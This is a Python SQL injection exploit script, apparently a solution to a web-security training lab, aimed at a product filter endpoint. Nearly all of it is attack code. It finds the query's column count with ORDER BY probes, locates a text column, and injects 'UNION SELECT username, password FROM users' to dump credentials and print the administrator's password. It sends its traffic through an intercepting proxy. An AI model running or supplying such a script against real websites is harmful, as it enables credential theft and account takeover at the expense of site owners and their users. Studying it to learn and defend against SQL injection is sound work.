#!/usr/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}

def perform_request(url,sql_payload):
    path = "filter?category=Pets"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def exploit_sqli_column_number(url):
    for i in range(1,50):
        sql_payload = " 'ORDER BY %s--" %i
        res = perform_request(url, sql_payload)
        if "Internal Server Error" in res:
            return i-1 
        i = i+1
    return False

def exploit_sqli_string_field(url,num_col):
    for i in range(1, num_col+1):
        string = "'a'"
        payload_list = ['NULL'] * num_col
        payload_list[i-1] = string
        sql_payload = "' UNION SELECT " + ', '.join(payload_list) + "--"        
        res = perform_request(url, sql_payload)
        if string.strip('\'') in res:
            return i
    return False


def exploit_sqli_users_table(url):
    username = 'administrator'    
    sql_payload = "' UNION SELECT username, password FROM users--"
    res = perform_request(url, sql_payload)
    if "administrator" in res:
        print("[+] Found the administrator password")
        soup = BeautifulSoup(res, 'html.parser')
        admin_password = soup.body.find(text = "administrator").parent.findNext('td').contents[0]
        print("[+] The administrator's password : '%s'" % admin_password)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1==1"' % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print("[+] The number of columns is " + str(num_col )+ ".")
        print ("[+] Figuring out which column contains text...")

        string_column = exploit_sqli_string_field(url,num_col)

        if string_column:
            print("[+] The column that contains text is "+ str(string_column)+".")
    
            print("[+] Dumping the list of usernames and passwords...")

            if not exploit_sqli_users_table(url):
                print("[-] Did not find the administrator's password")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] Did not find the number of columns")